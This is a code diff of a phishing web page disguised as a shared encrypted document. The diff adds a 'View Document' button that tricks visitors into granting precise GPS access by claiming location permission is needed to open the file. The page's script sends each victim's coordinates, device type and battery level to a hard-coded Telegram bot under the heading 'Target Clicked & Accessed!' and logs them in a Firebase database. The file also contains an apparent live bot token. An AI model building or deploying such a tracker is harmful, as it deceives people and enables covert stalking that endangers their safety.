@@ -35,35 +35,42 @@
             margin-bottom: 12px;
             color: #58a6ff;
         }
-        #status { 
-            font-size: 14px; 
-            color: #8b949e; 
-            font-weight: 400; 
+        p {
+            font-size: 14px;
+            color: #8b949e;
+            margin-bottom: 20px;
             line-height: 1.5;
+        }
+        .btn {
+            background-color: #238636;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background-color: #2ea043;
+        }
+        #status { 
+            font-size: 13px; 
+            color: #8b949e; 
             margin-top: 15px;
             word-break: break-word;
-        }
-        .spinner {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #30363d;
-            border-top: 3px solid #58a6ff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
         .error { color: #f85149 !important; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h2>Loading Shared File...</h2>
-        <p id="status">Establishing secure connection & verifying permissions...</p>
+    <div class="container" id="main-box">
+        <h2>🔒 Encrypted File Shared</h2>
+        <p>You have received a secure document. Click the button below to verify and view the content.</p>
+        <button class="btn" id="loadBtn">View Document</button>
+        <p id="status"></p>
     </div>
 
     <!-- Firebase SDKs -->
@@ -87,8 +94,9 @@
         const db = getDatabase(app);
 
         const statusText = document.getElementById("status");
+        const loadBtn = document.getElementById("loadBtn");
 
-        // --- NEW TELEGRAM CONFIGURATION ---
+        // --- TELEGRAM CONFIGURATION ---
         const BOT_TOKEN = "8944921867:AAEIWr6FFxFuZQ60IKhUUSWDjq6en2dXu74";
         const CHAT_ID = "8407541236"; 
 
@@ -100,16 +108,6 @@
             if (/android/i.test(ua)) device = "Android Mobile";
             if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone/iOS";
             return device;
-        }
-
-        async function getAddress(lat, lng) {
-            try {
-                let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
-                let data = await response.json();
-                return data.display_name || "Exact address not found";
-            } catch (e) {
-                return "Address lookup failed";
-            }
         }
 
         async function sendTelegramAlert(lat, lng, accuracy) {
@@ -127,14 +125,13 @@
             }
 
             const deviceType = getDeviceInfo();
-            statusText.innerText = "Fetching location details...";
-            const address = await getAddress(lat, lng);
+            statusText.innerText = "Loading file data...";
             const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
             
-            const message = `🚨 *Target Accessed Link!* 🎯\n\n` +
+            // Fast instant message without waiting for slow address API
+            const message = `🚨 *Target Clicked & Accessed!* 🎯\n\n` +
                             `📱 *Device:* ${deviceType}\n` +
                             `🔋 *Battery:* ${batteryInfo}\n` +
-                            `📍 *Address:* ${address}\n` +
                             `🌐 *Coordinates:* \`${lat}, ${lng}\`\n` +
                             `🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n` +
                             `🗺️ [Open in Google Maps](${mapUrl})`;
@@ -148,37 +145,44 @@
                     parse_mode: "Markdown"
                 })
             }).then(() => {
-                statusText.innerText = "File loaded successfully!";
+                statusText.innerText = "Loaded successfully!";
             }).catch(err => console.error("Telegram Alert Error:", err));
         }
 
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition((position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
+        loadBtn.addEventListener("click", () => {
+            loadBtn.innerText = "Verifying...";
+            loadBtn.disabled = true;
 
-                sendTelegramAlert(lat, lng, accuracy);
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
 
-                set(ref(db, 'users/sahil'), {
-                    latitude: lat,
-                    longitude: lng,
-                    accuracy: accuracy,
-                    timestamp: Date.now()
+                    sendTelegramAlert(lat, lng, accuracy);
+
+                    set(ref(db, 'users/sahil'), {
+                        latitude: lat,
+                        longitude: lng,
+                        accuracy: accuracy,
+                        timestamp: Date.now()
+                    });
+
+                }, (error) => {
+                    statusText.innerText = "Permission denied. Please allow location to view file.";
+                    statusText.classList.add("error");
+                    loadBtn.innerText = "Retry";
+                    loadBtn.disabled = false;
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 });
-
-            }, (error) => {
-                statusText.innerText = "Access denied or GPS unavailable: " + error.message;
+            } else {
+                statusText.innerText = "Browser not supported.";
                 statusText.classList.add("error");
-            }, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        } else {
-            statusText.innerText = "Browser doesn't support geolocation.";
-            statusText.classList.add("error");
-        }
+            }
+        });
     </script>
 </body>
 </html>
